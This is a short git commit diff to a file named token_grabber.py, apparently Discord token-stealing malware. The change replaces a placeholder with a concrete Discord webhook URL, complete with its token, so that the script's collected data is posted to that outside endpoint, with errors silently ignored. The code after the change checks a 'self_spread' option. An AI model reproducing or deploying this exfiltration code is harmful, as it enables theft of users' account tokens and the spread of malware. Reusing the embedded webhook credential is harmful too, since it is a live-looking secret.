ec1dcc9638d8eea0a967d29f6b9a4538d326ebde
molly69420 <97913618+molly69420@users.noreply.github.com>
2022-01-17 12:25:37 -0700

    Update token_grabber.py

--- token_grabber.py
+++ token_grabber.py
@@ -181,7 +181,7 @@ def main():
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("WEBHOOK_URL", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("https://discord.com/api/webhooks/932715751981326388/ZNPrPj2jWXT-SFK_sPzfFVja5BfSiv_wrjuR0JpIbKZcfewJRKNMMn53cC14JtAVhS7D", data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     if self_spread:
